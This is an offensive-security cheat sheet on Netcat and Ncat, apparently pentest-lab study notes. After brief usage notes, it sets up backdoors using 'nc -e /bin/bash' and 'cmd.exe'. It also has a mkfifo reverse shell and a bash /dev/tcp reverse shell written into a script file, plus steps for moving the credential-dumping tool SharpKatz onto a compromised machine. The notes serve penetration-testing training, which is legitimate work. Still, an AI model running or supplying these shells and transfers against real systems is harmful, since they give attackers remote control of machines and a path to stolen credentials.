**Netcat** functions as a back-end tool that allows for **port scanning and port listening**. In addition, you can actually *transfer files* directly through Netcat or use it as a backdoor into other networked systems.
Nmap Project produced **Ncat**, a modern reimplementation that supports *SSL, IPv6, SOCKS and HTTP proxies*, connection brokering, and more.

---
# Connect to a Server
In the simplest usage, "nc [host]  [port]" creates a *TCP connection to connect to the given port on the given target host*.  Your standard input is then sent to the host, and anything
that comes back across the connection is sent to your standard output.  This continues indefinitely, until the network side of the connection shuts down.  Note
that this behavior is different from most other applications which *Shut everything down* and exit after an end-of-file on the standard input.
Ex: **nc 10.10.16.54 21**

---
# Syntax
```sh
rlwrap -f . -r nc -nvlp [Port]
```
- **-n** : To Spectify An ***IP Address***, Not a *Domain Name*
- **-v** : Enable *Verbosity*
- **-l** : *Listen* For Requests On That Specific Port
- **-p** : *Port Number*
- **-k** : Keep listening after client disconnects
- **-n** : *Don't Resolve* The Name Via DNS
- **-u** : UDP Scan
- **-w** : Wait For The *Specified Amount Of Time*, Disconnect Afterwards
- **-e** : *Execute Commands*
- **-z** : *Port Scan* 
![[Pasted image 20221120213934.png]]
Here, *Connection Refused* Means *Closed Port*
Or *Firewall Is Blocking Your Requests (Rarely Happens)*


 ## Create A Backdoor
	 - Start Listening On Any Port With The Host Machine.
	    rlwrap -f . -r nc -nvlp [Port Number]
	 - Go To The Target Machine And Connect On The Port Of The Host Machine's IP
		 nc [Host IP] [Port Number] -e /bin/bash (If Linux)
		 nc [Host IP] [Port Number] -e cmd.exe (If Windows)
	- If this Technique *doesn't work*, try this :-
```sh
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.139.254 6666 >/tmp/f

# If in a file
echo "#!/bin/bash" > backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.8.139.254/1234 0>&1'" >> backup.sh
```

**rm /tmp/f ;** _#_ _removes any pre-existing directory called ‘/tmp/f’, the semicolon ends the command similar to hitting the ENTER key_ 
**mkfifo /tmp/f ;** _# creates a_ [_named pipe_](https://opensource.com/article/18/8/introduction-pipes-linux) _at the location ‘/tmp/f’_, semicolon ends the command  
**cat /tmp/f |** _# displays the contents of ‘/tmp/f’ and pipes the results into the next command_  
**/bin/sh -i 2>&1 |** _# invokes the default shell binary, the ‘-i’ tells it to use interactive mode,_ [_redirect stderr2 to the same destination as stdout1_](https://www.howtogeek.com/435903/what-are-stdin-stdout-and-stderr-on-linux/)_, and pipe that to the next command_  
**nc 10.8.6.159 1337 >/tmp/f** _# tell netcat to connect to the remote IP and PORT and redirect that output to the named pipe_


## File Sharing
- On Compromised Machine
```sh
# Using nc
nc -l -p 8000 > [Filename]


# Using ncat
ncat -l -p 8000 --recv-only > [Filename]
```

- On Attack Box
```sh
# Using nc
nc -q 0 [IP] 8000 < SharpKatz.exe
-q 0 will tell Netcat to close the connection once it finishes

# Using ncat
ncat --send-only [IP] 8000 < SharpKatz.exe
```

If we *don't have Netcat or Ncat on our compromised machine*, Bash supports read/write operations on a pseudo-device file `/dev/TCP/`.

```sh
# Sending file as input to Netcat/Ncat
nc -l -p 443 -q 0 < SharpKatz.exe
ncat -l -p 443 --send-only < SharpKatz.exe

# On Target Machine
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```


For more Info: https://academy.hackthebox.com/module/24/section/161

